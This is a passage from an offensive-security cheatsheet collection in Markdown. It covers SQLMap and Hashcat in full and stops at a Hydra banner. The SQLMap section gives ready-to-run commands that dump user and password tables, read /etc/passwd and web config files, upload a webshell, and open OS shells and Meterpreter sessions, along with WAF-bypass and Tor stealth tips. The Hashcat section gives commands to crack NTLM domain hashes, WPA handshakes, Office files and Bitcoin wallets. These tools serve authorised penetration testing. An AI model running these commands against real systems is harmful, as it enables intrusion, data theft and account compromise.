sqlmap -u "http://target.com/page.php?id=1" --cookie="PHPSESSID=abc123"

# Scan POST request
sqlmap -u "http://target.com/login.php" --data="user=admin&pass=test"

# Scan from file
sqlmap -r request.txt

# Full auto mode
sqlmap -u "http://target.com/page.php?id=1" --batch
```

---

## 💉 SQLMap — 🎯 Target Options

### URL Target (-u)
```bash
# Basic URL
sqlmap -u "http://target.com/page.php?id=1"

# Multiple parameters
sqlmap -u "http://target.com/page.php?id=1&cat=5"

# Specify parameter to test
sqlmap -u "http://target.com/page.php?id=1&cat=5" -p id

# Test all parameters
sqlmap -u "http://target.com/page.php?id=1&cat=5" --level=5
```

### Request File (-r)
```bash
# Save request from Burp Suite to file
# Then scan:
sqlmap -r request.txt

# Request file example:
# POST /login.php HTTP/1.1
# Host: target.com
# Content-Type: application/x-www-form-urlencoded
# Cookie: session=abc123
#
# username=admin&password=test
```

### Google Dork (-g)
```bash
# Search and test Google results
sqlmap -g "inurl:page.php?id="

# With specific pages
sqlmap -g "inurl:product.php?id= site:target.com"
```

### Direct Database Connection (-d)
```bash
# Connect directly to database
sqlmap -d "mysql://user:pass@target.com:3306/database"
sqlmap -d "mssql://user:pass@target.com:1433/database"
```

### Bulk Targets (-m)
```bash
# File with multiple URLs
sqlmap -m targets.txt

# targets.txt:
# http://target1.com/page.php?id=1
# http://target2.com/item.php?id=2
# http://target3.com/view.php?id=3
```

### Configuration File (-c)
```bash
# Use config file
sqlmap -c sqlmap.conf
```

---

## 💉 SQLMap — 📡 Request Options

### HTTP Method & Data
```bash
# POST data
sqlmap -u "http://target.com/login.php" --data="user=admin&pass=test"

# Specify method
sqlmap -u "http://target.com/api/user/1" --method=PUT

# JSON data
sqlmap -u "http://target.com/api" --data='{"id":1}' --headers="Content-Type: application/json"
```

### Cookies
```bash
# Single cookie
sqlmap -u "http://target.com/page.php?id=1" --cookie="PHPSESSID=abc123"

# Multiple cookies
sqlmap -u "http://target.com/page.php?id=1" --cookie="session=abc;auth=xyz"

# Load cookies from file
sqlmap -u "http://target.com/page.php?id=1" --load-cookies=cookies.txt

# Test cookie parameter
sqlmap -u "http://target.com/page.php" --cookie="id=1*" --level=2
```

### Headers
```bash
# Custom header
sqlmap -u "http://target.com/page.php?id=1" --headers="X-Forwarded-For: 127.0.0.1"

# Multiple headers
sqlmap -u "http://target.com/page.php?id=1" --headers="X-Forwarded-For: 127.0.0.1\nAccept-Language: en"

# User-Agent
sqlmap -u "http://target.com/page.php?id=1" --user-agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64)"

# Random User-Agent
sqlmap -u "http://target.com/page.php?id=1" --random-agent

# Referer
sqlmap -u "http://target.com/page.php?id=1" --referer="http://google.com"
```

### Authentication
```bash
# Basic auth
sqlmap -u "http://target.com/page.php?id=1" --auth-type=Basic --auth-cred="user:pass"

# Digest auth
sqlmap -u "http://target.com/page.php?id=1" --auth-type=Digest --auth-cred="user:pass"

# NTLM auth
sqlmap -u "http://target.com/page.php?id=1" --auth-type=NTLM --auth-cred="domain\\user:pass"
```

### Proxy
```bash
# HTTP proxy
sqlmap -u "http://target.com/page.php?id=1" --proxy="http://127.0.0.1:8080"

# SOCKS proxy
sqlmap -u "http://target.com/page.php?id=1" --proxy="socks5://127.0.0.1:9050"

# Tor
sqlmap -u "http://target.com/page.php?id=1" --tor --tor-type=SOCKS5

# Check Tor
sqlmap -u "http://target.com/page.php?id=1" --tor --check-tor
```

---

## 💉 SQLMap — 🔍 Detection Options

### Level & Risk
```bash
# Level (1-5) - Number of tests
sqlmap -u "http://target.com/page.php?id=1" --level=3

# Risk (1-3) - Danger of tests
sqlmap -u "http://target.com/page.php?id=1" --risk=2

# Recommended for thorough testing
sqlmap -u "http://target.com/page.php?id=1" --level=5 --risk=3
```

| Level | Tests |
|-------|-------|
| 1 | Default - Basic tests |
| 2 | + Cookie testing |
| 3 | + User-Agent, Referer testing |
| 4 | + More payloads |
| 5 | + All payloads |

| Risk | Description |
|------|-------------|
| 1 | Default - Safe tests |
| 2 | + Heavy time-based tests |
| 3 | + OR-based tests (may modify data!) |

### Technique Selection
```bash
# Specific technique
sqlmap -u "http://target.com/page.php?id=1" --technique=U    # Union only
sqlmap -u "http://target.com/page.php?id=1" --technique=B    # Boolean only
sqlmap -u "http://target.com/page.php?id=1" --technique=E    # Error only
sqlmap -u "http://target.com/page.php?id=1" --technique=T    # Time-based only
sqlmap -u "http://target.com/page.php?id=1" --technique=S    # Stacked only

# Multiple techniques
sqlmap -u "http://target.com/page.php?id=1" --technique=BEU

# All techniques (default)
sqlmap -u "http://target.com/page.php?id=1" --technique=BEUSTQ
```

### Time Delays
```bash
# Time for time-based injection (default: 5)
sqlmap -u "http://target.com/page.php?id=1" --time-sec=10

# Delay between requests
sqlmap -u "http://target.com/page.php?id=1" --delay=2
```

### Threads
```bash
# Concurrent connections (default: 1)
sqlmap -u "http://target.com/page.php?id=1" --threads=10
```

---

## 💉 SQLMap — 📊 Enumeration

### Database Enumeration
```bash
# Get current database
sqlmap -u "http://target.com/page.php?id=1" --current-db

# Get current user
sqlmap -u "http://target.com/page.php?id=1" --current-user

# Check if user is DBA
sqlmap -u "http://target.com/page.php?id=1" --is-dba

# List all databases
sqlmap -u "http://target.com/page.php?id=1" --dbs

# List all users
sqlmap -u "http://target.com/page.php?id=1" --users

# List user passwords
sqlmap -u "http://target.com/page.php?id=1" --passwords

# List privileges
sqlmap -u "http://target.com/page.php?id=1" --privileges

# List roles
sqlmap -u "http://target.com/page.php?id=1" --roles
```

### Table Enumeration
```bash
# List tables in database
sqlmap -u "http://target.com/page.php?id=1" -D database_name --tables

# List all tables
sqlmap -u "http://target.com/page.php?id=1" --tables

# Count table entries
sqlmap -u "http://target.com/page.php?id=1" -D database_name --count
```

### Column Enumeration
```bash
# List columns in table
sqlmap -u "http://target.com/page.php?id=1" -D database_name -T table_name --columns

# Search for column names
sqlmap -u "http://target.com/page.php?id=1" --search -C password
sqlmap -u "http://target.com/page.php?id=1" --search -C email,user
```

### Schema Dump
```bash
# Dump database schema
sqlmap -u "http://target.com/page.php?id=1" --schema

# Exclude system databases
sqlmap -u "http://target.com/page.php?id=1" --schema --exclude-sysdbs
```

---

## 💉 SQLMap — 📤 Data Extraction

### Dump Data
```bash
# Dump specific table
sqlmap -u "http://target.com/page.php?id=1" -D database -T users --dump

# Dump specific columns
sqlmap -u "http://target.com/page.php?id=1" -D database -T users -C username,password --dump

# Dump all tables in database
sqlmap -u "http://target.com/page.php?id=1" -D database --dump-all

# Dump everything
sqlmap -u "http://target.com/page.php?id=1" --dump-all

# Exclude system databases
sqlmap -u "http://target.com/page.php?id=1" --dump-all --exclude-sysdbs
```

### Limit Results
```bash
# First 10 rows
sqlmap -u "http://target.com/page.php?id=1" -D database -T users --dump --start=1 --stop=10

# Rows 5-15
sqlmap -u "http://target.com/page.php?id=1" -D database -T users --dump --start=5 --stop=15

# WHERE clause
sqlmap -u "http://target.com/page.php?id=1" -D database -T users --dump --where="admin=1"
```

### Custom SQL Queries
```bash
# Execute SQL query
sqlmap -u "http://target.com/page.php?id=1" --sql-query="SELECT version()"

# Interactive SQL shell
sqlmap -u "http://target.com/page.php?id=1" --sql-shell
```

### Output Formats
```bash
# Save to CSV
sqlmap -u "http://target.com/page.php?id=1" -D database -T users --dump --csv-del=","

# Save to HTML
sqlmap -u "http://target.com/page.php?id=1" -D database -T users --dump --output-dir=/tmp/output
```

---

## 💉 SQLMap — 📁 File Operations

### Read Files
```bash
# Read file from server
sqlmap -u "http://target.com/page.php?id=1" --file-read="/etc/passwd"

# Read Windows files
sqlmap -u "http://target.com/page.php?id=1" --file-read="C:/Windows/System32/drivers/etc/hosts"

# Read web config
sqlmap -u "http://target.com/page.php?id=1" --file-read="/var/www/html/config.php"
```

### Write Files
```bash
# Write file to server
sqlmap -u "http://target.com/page.php?id=1" --file-write="/local/shell.php" --file-dest="/var/www/html/shell.php"

# Upload webshell
sqlmap -u "http://target.com/page.php?id=1" --file-write="./webshell.php" --file-dest="/var/www/html/cmd.php"
```

---

## 💉 SQLMap — 💻 OS Access

### Command Execution
```bash
# Execute OS command
sqlmap -u "http://target.com/page.php?id=1" --os-cmd="whoami"

# Interactive shell
sqlmap -u "http://target.com/page.php?id=1" --os-shell

# PowerShell on Windows
sqlmap -u "http://target.com/page.php?id=1" --os-shell --os-cmd="powershell"
```

### Meterpreter Session
```bash
# Get Meterpreter session
sqlmap -u "http://target.com/page.php?id=1" --os-pwn

# With specific options
sqlmap -u "http://target.com/page.php?id=1" --os-pwn --msf-path=/opt/metasploit
```

### SMB Relay
```bash
# SMB relay attack
sqlmap -u "http://target.com/page.php?id=1" --os-smbrelay
```

### Registry Access (Windows)
```bash
# Read registry
sqlmap -u "http://target.com/page.php?id=1" --reg-read -reg-key="HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft"

# Add registry key
sqlmap -u "http://target.com/page.php?id=1" --reg-add --reg-key="..." --reg-value="..." --reg-data="..." --reg-type=REG_SZ

# Delete registry key
sqlmap -u "http://target.com/page.php?id=1" --reg-del --reg-key="..." --reg-value="..."
```

---

## 💉 SQLMap — 🛡️ Bypass Techniques

### WAF/IPS Bypass
```bash
# Identify WAF
sqlmap -u "http://target.com/page.php?id=1" --identify-waf

# Skip WAF detection
sqlmap -u "http://target.com/page.php?id=1" --skip-waf

# Random case
sqlmap -u "http://target.com/page.php?id=1" --tamper=randomcase

# Multiple tamper scripts
sqlmap -u "http://target.com/page.php?id=1" --tamper=space2comment,randomcase,between
```

### Common Tamper Scripts
```bash
# URL encoding
--tamper=charencode

# Double URL encoding
--tamper=chardoubleencode

# Unicode encoding
--tamper=charunicodeencode

# Replace spaces with comments
--tamper=space2comment
--tamper=space2hash
--tamper=space2morehash

# Case manipulation
--tamper=randomcase
--tamper=lowercase
--tamper=uppercase

# Replace keywords
--tamper=between
--tamper=equaltolike
```

### Tamper Scripts Reference

| Script | Description |
|--------|-------------|
| `apostrophemask` | Replace apostrophe with UTF-8 |
| `apostrophenullencode` | Replace apostrophe with double unicode |
| `base64encode` | Base64 encode payload |
| `between` | Replace `>` with `NOT BETWEEN 0 AND #` |
| `charencode` | URL encode all characters |
| `charunicodeencode` | Unicode-URL encode |
| `concat2concatws` | Replace `CONCAT` with `CONCAT_WS` |
| `equaltolike` | Replace `=` with `LIKE` |
| `greatest` | Replace `>` with `GREATEST` |
| `halfversionedmorekeywords` | Add versioned MySQL comment |
| `ifnull2ifisnull` | Replace `IFNULL` with `IF(ISNULL())` |
| `lowercase` | Replace keywords with lowercase |
| `modsecurityversioned` | Bypass ModSecurity with versioned comment |
| `modsecurityzeroversioned` | Bypass ModSecurity with zero-versioned comment |
| `percentage` | Add percentage sign in front of characters |
| `randomcase` | Random keyword case |
| `randomcomments` | Add random comments to SQL keywords |
| `securesphere` | Append special string to bypass SecureSphere |
| `space2comment` | Replace space with `/**/` |
| `space2dash` | Replace space with dash comment `--` |
| `space2hash` | Replace space with `#` comment |
| `space2morehash` | Replace space with `#` and newline |
| `space2mssqlblank` | Replace space with MSSQL blank characters |
| `space2mssqlhash` | Replace space with `#` and newline (MSSQL) |
| `space2plus` | Replace space with `+` |
| `space2randomblank` | Replace space with random blank character |
| `symboliclogical` | Replace `AND`/`OR` with `&&`/`||` |
| `unionalltounion` | Replace `UNION ALL` with `UNION` |
| `unmagicquotes` | Replace quote with multibyte `%bf%27` |
| `uppercase` | Replace keywords with uppercase |
| `versionedkeywords` | Enclose keywords with versioned comment |
| `versionedmorekeywords` | Enclose more keywords with versioned comment |
| `xforwardedfor` | Add fake `X-Forwarded-For` header |

---

## 💉 SQLMap — 🎬 Real-World Examples

### Example 1: Basic Scan
```bash
# Scan with auto mode
sqlmap -u "http://target.com/products.php?id=1" --batch --banner
```

### Example 2: Full Database Dump
```bash
# Enumerate and dump
sqlmap -u "http://target.com/page.php?id=1" \
    --dbs \
    --batch

# After finding database
sqlmap -u "http://target.com/page.php?id=1" \
    -D shop_db \
    --tables \
    --batch

# Dump users table
sqlmap -u "http://target.com/page.php?id=1" \
    -D shop_db \
    -T users \
    --dump \
    --batch
```

### Example 3: POST Request with Cookie
```bash
sqlmap -u "http://target.com/login.php" \
    --data="username=admin&password=test" \
    --cookie="PHPSESSID=abc123" \
    --level=3 \
    --risk=2 \
    --batch
```

### Example 4: Through Burp Proxy
```bash
# Save request from Burp to file, then:
sqlmap -r request.txt \
    --proxy="http://127.0.0.1:8080" \
    --batch
```

### Example 5: WAF Bypass
```bash
sqlmap -u "http://target.com/page.php?id=1" \
    --tamper=space2comment,randomcase,between \
    --random-agent \
    --level=3 \
    --risk=2 \
    --batch
```

### Example 6: Get OS Shell
```bash
sqlmap -u "http://target.com/page.php?id=1" \
    --os-shell \
    --batch
```

### Example 7: Read Sensitive Files
```bash
sqlmap -u "http://target.com/page.php?id=1" \
    --file-read="/etc/passwd" \
    --batch
```

---

## 💉 SQLMap — 📊 Quick Reference

### Essential Commands

| Command | Description |
|---------|-------------|
| `-u URL` | Target URL with parameter |
| `-r FILE` | Load request from file |
| `--data=DATA` | POST data |
| `--cookie=COOKIE` | HTTP Cookie |
| `--dbs` | List databases |
| `--tables` | List tables |
| `--columns` | List columns |
| `--dump` | Dump data |
| `-D DB` | Specify database |
| `-T TABLE` | Specify table |
| `-C COLS` | Specify columns |
| `--batch` | Non-interactive mode |

### Detection Options

| Option | Description |
|--------|-------------|
| `--level=LEVEL` | Test level (1-5) |
| `--risk=RISK` | Risk level (1-3) |
| `-p PARAM` | Testable parameter |
| `--technique=TECH` | Injection technique |
| `--threads=N` | Concurrent threads |

### Output Options

| Option | Description |
|--------|-------------|
| `-v LEVEL` | Verbosity (0-6) |
| `--batch` | Never ask for input |
| `--flush-session` | Clear session cache |
| `--output-dir=DIR` | Custom output directory |

---

## 💉 SQLMap — 💡 Tips & Best Practices

### Performance Tips

1. **Start Simple**
   ```bash
   # Start with low level
   sqlmap -u "URL" --level=1 --batch
   # Increase if needed
   ```

2. **Use --batch for Automation**
   ```bash
   sqlmap -u "URL" --batch --dbs
   ```

3. **Save Time with Specific Tests**
   ```bash
   # Test only Union-based
   sqlmap -u "URL" --technique=U
   ```

### Stealth Tips

1. **Random User-Agent**
   ```bash
   sqlmap -u "URL" --random-agent
   ```

2. **Add Delay**
   ```bash
   sqlmap -u "URL" --delay=2
   ```

3. **Use Tor**
   ```bash
   sqlmap -u "URL" --tor --check-tor
   ```

### Troubleshooting

| Issue | Solution |
|-------|----------|
| No injection found | Increase `--level` and `--risk` |
| WAF blocking | Use `--tamper` scripts |
| Slow scan | Reduce `--level`, use specific `--technique` |
| Connection issues | Check `--timeout`, `--retries` |

---

## 💉 SQLMap — 📚 Resources

### Official Resources
- [SQLMap Official Website](https://sqlmap.org/)
- [SQLMap GitHub](https://github.com/sqlmapproject/sqlmap)
- [SQLMap Wiki](https://github.com/sqlmapproject/sqlmap/wiki)

### Learning Resources
- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [PortSwigger SQL Injection](https://portswigger.net/web-security/sql-injection)

### Related Cheatsheets
- [Metasploit Framework](../Metasploit/README.md)
- [Meterpreter](../Metasploit/Meterpreter.md)

---

<p align="center">
  <b>💉 Master SQL Injection Testing!</b><br>
  <i>With great power comes great responsibility</i>
</p>

## 🔑 Hashcat — # ⚡ Hashcat - Complete Cheatsheet

```
  _   _           _                _   
 | | | | __ _ ___| |__   ___ __ _| |_ 
 | |_| |/ _` / __| '_ \ / __/ _` | __|
 |  _  | (_| \__ \ | | | (_| (_| | |_ 
 |_| |_|\__,_|___/_| |_|\___\__,_|\__|
                                       
    World's Fastest Password Recovery
```

<p align="center">
  <img src="https://img.shields.io/badge/Hashcat-GPU_Cracker-red?style=for-the-badge" alt="Hashcat">
  <img src="https://img.shields.io/badge/350+-Hash_Types-orange?style=for-the-badge" alt="Hash Types">
  <img src="https://img.shields.io/badge/GPU-Accelerated-blue?style=for-the-badge" alt="GPU">
  <img src="https://img.shields.io/badge/World's-Fastest-green?style=for-the-badge" alt="Fastest">
</p>

<p align="center">
  <b>🚀 The world's fastest and most advanced password recovery utility</b>
</p>

---

## 🔑 Hashcat — 📋 Table of Contents

- [Introduction](#-introduction)
- [Installation](#-installation)
- [Basic Syntax](#-basic-syntax)
- [Attack Modes](#-attack-modes)
- [Hash Modes](#-hash-modes)
- [Mask Attack](#-mask-attack)
- [Rules](#-rules)
- [Session Management](#-session-management)
- [GPU Optimization](#-gpu-optimization)
- [Real-World Examples](#-real-world-examples)
- [Quick Reference](#-quick-reference)
- [Tips & Best Practices](#-tips--best-practices)
- [Resources](#-resources)

---

## 🔑 Hashcat — 📥 Installation

### Kali Linux
```bash
sudo apt update && sudo apt install hashcat

# With OpenCL
sudo apt install hashcat-nvidia  # NVIDIA
sudo apt install hashcat-amd     # AMD
```

### Ubuntu/Debian
```bash
sudo apt install hashcat
```

### Windows
```bash
# Download from official site
https://hashcat.net/hashcat/

# Extract and run from folder
hashcat.exe -h
```

### From Source
```bash
git clone https://github.com/hashcat/hashcat.git
cd hashcat
make
./hashcat -h
```

### Verify Installation
```bash
hashcat --version
hashcat -I                    # Show OpenCL devices
hashcat -b                    # Run benchmark
```

---

## 🔑 Hashcat — ⌨️ Basic Syntax

### General Syntax
```bash
hashcat [options] hash|hashfile [dictionary|mask]
```

### Essential Options

| Option | Description |
|--------|-------------|
| `-m` | Hash type (mode) |
| `-a` | Attack mode |
| `-o` | Output file |
| `-r` | Rules file |
| `--show` | Show cracked passwords |
| `--status` | Enable status screen |
| `-w` | Workload profile (1-4) |
| `--force` | Ignore warnings |
| `-O` | Optimized kernels |

### Quick Start
```bash
# Basic dictionary attack
hashcat -m 0 -a 0 hash.txt wordlist.txt

# Show cracked hashes
hashcat -m 0 hash.txt --show

# Check example hashes
hashcat -m 0 --example-hashes
```

---

## 🔑 Hashcat — 🎮 Attack Modes

### Overview

| Mode | Name | Description |
|------|------|-------------|
| `-a 0` | Dictionary | Wordlist attack |
| `-a 1` | Combination | Combine two wordlists |
| `-a 3` | Brute-Force | Mask-based attack |
| `-a 6` | Hybrid Dict+Mask | Wordlist + mask |
| `-a 7` | Hybrid Mask+Dict | Mask + wordlist |
| `-a 9` | Association | Word associations |

### Dictionary Attack (-a 0)

```bash
# Basic dictionary attack
hashcat -m 0 -a 0 hash.txt wordlist.txt

# With rules
hashcat -m 0 -a 0 hash.txt wordlist.txt -r rules/best64.rule

# Multiple wordlists
hashcat -m 0 -a 0 hash.txt wordlist1.txt wordlist2.txt
```

### Combination Attack (-a 1)

Combines words from two wordlists.

```bash
# Combine two wordlists
hashcat -m 0 -a 1 hash.txt wordlist1.txt wordlist2.txt

# word1word2 combinations
```

### Brute-Force/Mask Attack (-a 3)

```bash
# All lowercase, 6 characters
hashcat -m 0 -a 3 hash.txt ?l?l?l?l?l?l

# All digits, 4-8 characters
hashcat -m 0 -a 3 hash.txt ?d?d?d?d --increment --increment-min=4 --increment-max=8

# Custom charset
hashcat -m 0 -a 3 hash.txt -1 ?l?d ?1?1?1?1?1?1
```

### Hybrid Attacks (-a 6, -a 7)

```bash
# Dictionary + Mask (append)
hashcat -m 0 -a 6 hash.txt wordlist.txt ?d?d?d?d

# Mask + Dictionary (prepend)
hashcat -m 0 -a 7 hash.txt ?d?d?d?d wordlist.txt
```

---

## 🔑 Hashcat — 🔢 Hash Modes

### Most Common Hash Modes

| Mode | Hash Type | Example |
|------|-----------|---------|
| 0 | MD5 | `5d41402abc4b2a76b9719d911017c592` |
| 100 | SHA1 | `aaf4c61ddcc5e8a2dabede0f3b482cd9aea9434d` |
| 1400 | SHA256 | `2cf24dba5fb0a30e26e83b2ac5b9e29e...` |
| 1700 | SHA512 | `cf83e1357eefb8bdf1542850d66d8007d620e405...` |
| 1000 | NTLM | `32ed87bdb5fdc5e9cba88547376818d4` |
| 3000 | LM | `aad3b435b51404ee` |
| 5600 | NetNTLMv2 | Complex format |
| 3200 | bcrypt | `$2a$10$...` |
| 1800 | sha512crypt (Linux) | `$6$...` |
| 500 | md5crypt (Linux) | `$1$...` |

### Web Applications

| Mode | Hash Type |
|------|-----------|
| 400 | WordPress (phpass) |
| 2500 | WPA/WPA2 |
| 22000 | WPA-PBKDF2-PMKID+EAPOL |
| 121 | SMF |
| 2611 | vBulletin |
| 3711 | MediaWiki B |
| 7900 | Drupal7 |

### Databases

| Mode | Hash Type |
|------|-----------|
| 300 | MySQL4.1/MySQL5 |
| 200 | MySQL323 |
| 1731 | MSSQL (2012, 2014) |
| 112 | Oracle S |
| 12300 | Oracle T |

### Documents & Archives

| Mode | Hash Type |
|------|-----------|
| 9600 | Office 2013 |
| 9500 | Office 2010 |
| 9400 | Office 2007 |
| 9700 | MS Office ⇐ 2003 |
| 10500 | PDF 1.4-1.6 |
| 10700 | PDF 1.7 Level 8 |
| 11600 | 7-Zip |
| 13600 | WinZip |
| 17200 | PKZIP |
| 13000 | RAR5 |
| 12500 | RAR3-hp |

### Cryptocurrency

| Mode | Hash Type |
|------|-----------|
| 11300 | Bitcoin wallet |
| 12700 | Blockchain wallet |
| 16600 | Electrum wallet |
| 15200 | Ethereum Keystore |

### List/Search Modes
```bash
# List all hash modes
hashcat --help | grep -i "hash modes"

# Search for specific hash
hashcat --example-hashes | grep -i "ntlm"
hashcat --example-hashes | grep -i "sha256"

# Show example hash format
hashcat -m 1000 --example-hashes
```

---

## 🔑 Hashcat — 🎭 Mask Attack

### Charset Placeholders

| Placeholder | Characters |
|-------------|------------|
| `?l` | abcdefghijklmnopqrstuvwxyz |
| `?u` | ABCDEFGHIJKLMNOPQRSTUVWXYZ |
| `?d` | 0123456789 |
| `?h` | 0123456789abcdef |
| `?H` | 0123456789ABCDEF |
| `?s` | !"#$%&'()*+,-./:;<=>?@[]^_`{|}~ |
| `?a` | ?l?u?d?s |
| `?b` | 0x00 - 0xff |

### Custom Charsets

```bash
# Define custom charset
hashcat -a 3 -1 ?l?d hash.txt ?1?1?1?1?1?1

# Multiple custom charsets
hashcat -a 3 -1 abc -2 123 hash.txt ?1?2?1?2

# Special characters
hashcat -a 3 -1 '!@#$%' hash.txt pass?1?1?1?1
```

### Increment Mode

```bash
# Try lengths 1-8
hashcat -a 3 hash.txt ?a?a?a?a?a?a?a?a --increment

# Specify min/max
hashcat -a 3 hash.txt ?a?a?a?a?a?a?a?a --increment --increment-min=4 --increment-max=8
```

### Common Mask Patterns

```bash
# 8 lowercase letters
?l?l?l?l?l?l?l?l

# Password + 4 digits
password?d?d?d?d

# Capital + lowercase + digits
?u?l?l?l?l?l?d?d

# Winter2024 pattern
?u?l?l?l?l?l?d?d?d?d

# Phone number
?d?d?d?d?d?d?d?d?d?d
```

---

## 🔑 Hashcat — 📜 Rules

### Built-in Rule Files

```bash
# Location
ls /usr/share/hashcat/rules/

# Popular rules
best64.rule           # Best 64 rules
rockyou-30000.rule    # Top 30000 rules
d3ad0ne.rule          # D3ad0ne rules
dive.rule             # Dive rules
generated.rule        # Generated rules
```

### Using Rules

```bash
# Single rule file
hashcat -m 0 -a 0 hash.txt wordlist.txt -r best64.rule

# Multiple rule files
hashcat -m 0 -a 0 hash.txt wordlist.txt -r rule1.rule -r rule2.rule

# Generate rules
hashcat -m 0 -a 0 hash.txt wordlist.txt -g 1000
```

### Common Rule Operations

| Rule | Description | Example |
|------|-------------|---------|
| `:` | Do nothing | password |
| `l` | Lowercase all | PASSWORD → password |
| `u` | Uppercase all | password → PASSWORD |
| `c` | Capitalize | password → Password |
| `C` | Lowercase first, rest upper | password → pASSWORD |
| `t` | Toggle case | password → PASSWORD |
| `r` | Reverse | password → drowssap |
| `d` | Duplicate | pass → passpass |
| `$X` | Append X | pass → passX |
| `^X` | Prepend X | pass → Xpass |
| `sXY` | Replace X with Y | password → pa$$word |

---

## 🔑 Hashcat — 💾 Session Management

### Create Session
```bash
# Named session
hashcat -m 0 -a 0 hash.txt wordlist.txt --session=mysession

# Session files stored in ~/.hashcat/sessions/
```

### Pause & Resume
```bash
# Pause: Press 'p' during cracking
# Resume: Press 'r' during cracking

# Or restore from command line
hashcat --session=mysession --restore
```

### Status Commands

During cracking:
- `s` - Show status
- `p` - Pause
- `r` - Resume
- `b` - Bypass (skip current attack)
- `c` - Checkpoint
- `q` - Quit

### Output Options
```bash
# Output to file
hashcat -m 0 -a 0 hash.txt wordlist.txt -o cracked.txt

# Output format
hashcat -m 0 hash.txt --outfile-format=2    # hash:plain

# Show cracked
hashcat -m 0 hash.txt --show

# Show remaining (uncracked)
hashcat -m 0 hash.txt --left
```

---

## 🔑 Hashcat — 🚀 GPU Optimization

### Workload Profiles

| Profile | Description |
|---------|-------------|
| `-w 1` | Low (default, interactive) |
| `-w 2` | Medium |
| `-w 3` | High (may freeze desktop) |
| `-w 4` | Nightmare (dedicated cracking) |

### Optimize Commands
```bash
# High performance
hashcat -m 0 -a 0 hash.txt wordlist.txt -w 3 -O

# Optimized kernels (faster, limited password length)
hashcat -m 0 -a 0 hash.txt wordlist.txt -O

# Force device
hashcat -m 0 -a 0 hash.txt wordlist.txt -d 1

# Disable CPU, use only GPU
hashcat -m 0 -a 0 hash.txt wordlist.txt -D 2
```

### Device Options
```bash
# List devices
hashcat -I

# Select specific device
hashcat -d 1 ...

# Device types
# -D 1 = CPU
# -D 2 = GPU
# -D 3 = FPGA
```

### Benchmark
```bash
# Full benchmark
hashcat -b

# Specific hash type
hashcat -b -m 0

# Benchmark without OpenCL optimization
hashcat -b --benchmark-all
```

---

## 🔑 Hashcat — 🎬 Real-World Examples

### Example 1: MD5 Dictionary Attack
```bash
hashcat -m 0 -a 0 md5_hashes.txt /usr/share/wordlists/rockyou.txt
```

### Example 2: NTLM with Rules
```bash
hashcat -m 1000 -a 0 ntlm_hashes.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule
```

### Example 3: WPA/WPA2 Handshake
```bash
# Convert to hashcat format first
hcxpcapngtool -o hash.hc22000 capture.pcapng

# Crack
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt
```

### Example 4: SHA256 Brute Force (6 chars)
```bash
hashcat -m 1400 -a 3 sha256_hash.txt ?a?a?a?a?a?a
```

### Example 5: Office 2013 Document
```bash
# Extract hash with office2john
office2john document.docx > office.hash

# Crack
hashcat -m 9600 office.hash wordlist.txt
```

### Example 6: Linux Shadow Password
```bash
hashcat -m 1800 -a 0 shadow_hash.txt wordlist.txt
```

### Example 7: WordPress Hash
```bash
hashcat -m 400 -a 0 wordpress_hash.txt wordlist.txt
```

### Example 8: Hybrid Attack
```bash
# Company name + 4 digits
hashcat -m 0 -a 6 hash.txt company_names.txt ?d?d?d?d
```

### Example 9: Windows Domain Hashes
```bash
# NTLM hashes from secretsdump
hashcat -m 1000 -a 0 ntds_hashes.txt wordlist.txt -r best64.rule --username
```

### Example 10: Bitcoin Wallet
```bash
# Extract with bitcoin2john
hashcat -m 11300 bitcoin_hash.txt wordlist.txt
```

---

## 🔑 Hashcat — 📊 Quick Reference

### Essential Commands

| Task | Command |
|------|---------|
| MD5 dictionary | `hashcat -m 0 -a 0 hash.txt wordlist.txt` |
| NTLM brute force | `hashcat -m 1000 -a 3 hash.txt ?a?a?a?a?a?a` |
| SHA256 with rules | `hashcat -m 1400 -a 0 hash.txt wordlist.txt -r rules.rule` |
| Show cracked | `hashcat -m 0 hash.txt --show` |
| Benchmark | `hashcat -b` |
| List devices | `hashcat -I` |
| Restore session | `hashcat --session=name --restore` |

### Common Hash Modes

| Mode | Type |
|------|------|
| 0 | MD5 |
| 100 | SHA1 |
| 1000 | NTLM |
| 1400 | SHA256 |
| 1800 | sha512crypt |
| 3200 | bcrypt |
| 22000 | WPA2 |

### Attack Modes

| Mode | Type |
|------|------|
| -a 0 | Dictionary |
| -a 1 | Combination |
| -a 3 | Brute-force |
| -a 6 | Hybrid (dict+mask) |
| -a 7 | Hybrid (mask+dict) |

---

## 🔑 Hashcat — 💡 Tips & Best Practices

### Efficiency Tips

1. **Start with Dictionary + Rules**
   ```bash
   hashcat -m 0 -a 0 hash.txt rockyou.txt -r best64.rule
   ```

2. **Use Optimized Kernels**
   ```bash
   hashcat -O ...
   ```

3. **Target Common Patterns**
   ```bash
   # Season+Year: Winter2024
   hashcat -a 3 -1 WSFJ -2 winterumeall hash.txt ?1?2?2?2?2?2?d?d?d?d
   ```

### Performance Tips

```bash
# Maximum performance (dedicated system)
hashcat -m 0 -a 0 hash.txt wordlist.txt -w 4 -O --force

# Multiple GPUs
hashcat -d 1,2 ...
```

### Workflow

```
1. Identify hash type
2. Try dictionary attack with rules
3. Try targeted masks (patterns)
4. Try full brute force (if feasible)
5. Try hybrid attacks
```

---

## 🔑 Hashcat — 📚 Resources

### Official Resources
- [Hashcat Official](https://hashcat.net/hashcat/)
- [Hashcat Wiki](https://hashcat.net/wiki/)
- [Hashcat GitHub](https://github.com/hashcat/hashcat)
- [Hashcat Forum](https://hashcat.net/forum/)

### Wordlists
- [SecLists](https://github.com/danielmiessler/SecLists)
- [RockYou](https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt)
- [CrackStation](https://crackstation.net/crackstation-wordlist-password-cracking-dictionary.htm)

### Related Cheatsheets
- [John the Ripper](../John-The-Ripper/README.md)
- [Hydra](../Hydra/README.md)
- [Nmap](../Nmap/README.md)

---

<p align="center">
  <b>⚡ Master GPU Password Cracking!</b><br>
  <i>The world's fastest password recovery</i>
</p>

## 🔐 Hydra — # 🔓 Hydra - Complete Cheatsheet

```
  _   _           _           
 | | | |_   _  __| |_ __ __ _ 
 | |_| | | | |/ _` | '__/ _` |
 |  _  | |_| | (_| | | | (_| |
 |_| |_|\__, |\__,_|_|  \__,_|
        |___/                  
    The Fast Network Login Cracker
```

